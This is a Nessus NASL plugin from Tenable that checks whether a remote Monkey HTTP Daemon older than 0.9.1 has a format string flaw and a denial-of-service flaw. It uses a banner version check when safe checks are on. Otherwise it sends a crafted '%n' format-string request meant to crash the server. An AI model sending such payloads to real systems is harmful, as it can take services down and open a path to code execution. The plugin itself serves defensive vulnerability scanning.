#
# (C) Tenable Network Security
#
# 

  desc["english"] = "
The version of the Monkey HTTP Server installed on the remote host
suffers from the following flaws:

  - A Format String Vulnerability
    A remote attacker may be able to execute arbitrary code with the
    permissions of the user running monkeyd by sending a 
    specially-crafted request.

  - A Denial of Service Vulnerability
    Repeated requesting a zero-byte length file, if one exists, 
    could cause the web server to crash.

See also : http://bugs.gentoo.org/show_bug.cgi?id=87916

Solution : Upgrade to monkeyd 0.9.1 or later.

Risk factor : High";


if (description) {
  script_id(18059);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(13187, 13188);
  if (defined_func("script_xref")) {
    script_xref(name:"GLSA", value:"200504-14");
  }

  name["english"] = "Monkey HTTP Daemon < 0.9.1 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Monkey HTTP Daemon < 0.9.1";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  # nb: by default, monkeyd listens on port 2001
  script_require_ports("Services/www", 80, 2001);

  exit(0);
}


include("http_func.inc");


port = get_http_port(default:2001);
if (!get_port_state(port)) port = 80;
if (!get_port_state(port) || get_kb_item("Services/www/" + port + "/broken") ) exit(0);


# Make sure it's Monkey.
banner = get_http_banner(port:port);
if (
  !banner || 
  !egrep(pattern:"^Server:.*Monkey/", string:banner)
) exit(0);


# If safe chceks are enabled, check the version number.
if (safe_checks()) {
  if (egrep(string:banner, pattern:"^Server: +Monkey/0\.([0-8]|9\.[01][^0-9])")) {
    desc = str_replace(
      string:desc["english"],
      find:"Solution :",
      replace:string(
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of Monkey HTTP\n",
        "***** Daemon installed there.\n",
        "\n",
        "Solution :"
      )
    );
    security_hole(port:port, data:desc);
  }
}
# Otherwise, try to crash it.
#
# nb: this *should* just crash the child processing the request, 
#     not the parent itself.
else {
  # Just for grins, make sure it's up first.
  soc = http_open_socket(port);
  if (!soc) exit(0);
  req = string("GET / HTTP/1.1\nHost: ", get_host_name(), "\n\n");
  send(socket:soc, data:req);
  res = http_recv(socket:soc);
  http_close_socket(soc);
  if (res == NULL) exit(0);

  # And now, exploit it.
  soc = http_open_socket(port);
  if (!soc) exit(0);
  req = "GET %%00 HTTP/1.1\nHost: %%500n%%500n\n\n";
  send(socket:soc, data:req);
  res = http_recv(socket:soc);
  http_close_socket(soc);
  if (!res) security_hole(port);
}
